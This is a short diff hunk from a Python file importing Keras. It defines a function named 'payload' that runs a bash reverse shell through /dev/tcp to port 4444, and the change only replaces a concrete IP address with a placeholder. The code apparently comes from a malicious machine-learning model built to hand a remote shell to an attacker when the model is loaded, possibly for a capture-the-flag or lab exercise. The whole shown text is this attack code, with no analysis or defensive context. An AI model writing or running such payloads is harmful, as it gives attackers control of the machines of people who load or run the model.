@@ -4,7 +4,7 @@ from tensorflow.keras import layers
 
 def payload(x):
     import os
-    os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.93/4444 0>&1'")
+    os.system("bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'")
     return x
 
 
